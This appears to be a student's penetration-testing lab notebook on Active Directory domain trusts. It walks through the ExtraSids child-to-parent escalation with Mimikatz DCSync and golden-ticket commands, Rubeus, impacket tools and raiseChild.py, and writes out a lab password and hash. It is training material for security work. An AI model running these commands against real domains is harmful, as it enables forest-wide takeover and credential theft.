
- When a company acquires another, they inherit their security posture, good or bad.

> A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:

## Different types of trusts:
1. **Parent-child**: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.
2. **Cross-link**: A trust between child domains to speed up authentication 
![[Pasted image 20250630224647.png]]
3. **Tree-root**: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.

#### Transitive Trusts:
Trust is extended to objects that the child domain trusts.
```
if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
```

#### Non-Transitive Trusts:
```
The child domain itself is the only one that is trusted. Nothing the child domain trusts additionally is trusted.
```

#### One-Way Trusts:
```
Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.
```

#### Bidirectional Trust:
```
A <-> B
```


> ==If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly.==

"I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain."

# Attacking Domain Trusts Child -> Parent - From Windows:
|Term|Summary|
|---|---|
|**SID History**|Attribute storing old SIDs to maintain access across migrations|
|**SID Injection**|Attacker adds privileged SID to a user’s SID history to escalate|
|**Golden Ticket**|Forged Kerberos TGT using KRBTGT hash — grants long-term domain access|
|**ExtraSIDs Attack**|Used to escalate from a child to parent domain in the same forest|
|**KRBTGT Hash**|Key to creating valid Golden Tickets; should be rotated after compromise|
|**DCSync Attack**|Lets attacker pull password hashes (including KRBTGT) from a Domain Controller|
## ExtraSids Attack - Mimikatz

```Powershell
# How the ExtraSid attack plays out

# 1. On the domain that you control, get the KRBTGT hash with Mimikatz

mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# Get the Child SID:
Get-DomainSID

# Get the SID from the parent domain:
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Now you have what you need:
1. KRBTGT hash for the child domain
2. SID of the Child domain
3. SID of the Admin group you want to take advantage of in the parent domain
4. The name of the target user in the child domain (does not need to be a real user!)
5. The FQDN of the child domain


# Now we can run the command to get access to the DC on the parent domain:

kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

```

## ExtraSids Attack - Rubeus

```PowerShell
# Using the above information

.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

```


# Attacking Domain Trusts Child -> Parent - From Linux:
- We still need the same information as Windows, we just need to get it in another way.

They are:
1. The KRBTGT hash for the child domain
2. The SID for the child domain
3. The name of a target user in the child domain (does not need to exist!)
4. The FQDN of the child domain
5. The SID of the Enterprise Admins group of the root domain

```shell
# Once you have full control of the child domain (In this case access to the htb-student_adm account, you can conduct a DCSync attack, requesting the krbtgt accounts hash)

# password is HTB_@cademy_stdnt_admin!

secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Now we need to get the SID of the child domain with lookupsid.py

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240

# Now get the SID of the parent domain and the group we want our malicious account to be added to:

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"


```
#### Now we have what we need:
- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

### Now construct a golden ticket using ticketer.py
```shell

ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

# Now set KRB5CCNAME environment variable:

export KRB5CCNAME=hacker.ccache 

```

#### Now we can check if we can authenticate to the PARENT domain's DC using impacket's version of PSexec:
```shell

psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

```

#### raiseChild.py will automate this process!
***raiseChild.py:***
- Obtains the SID for the Enterprise Admins group of the parent domain
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain

```shell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
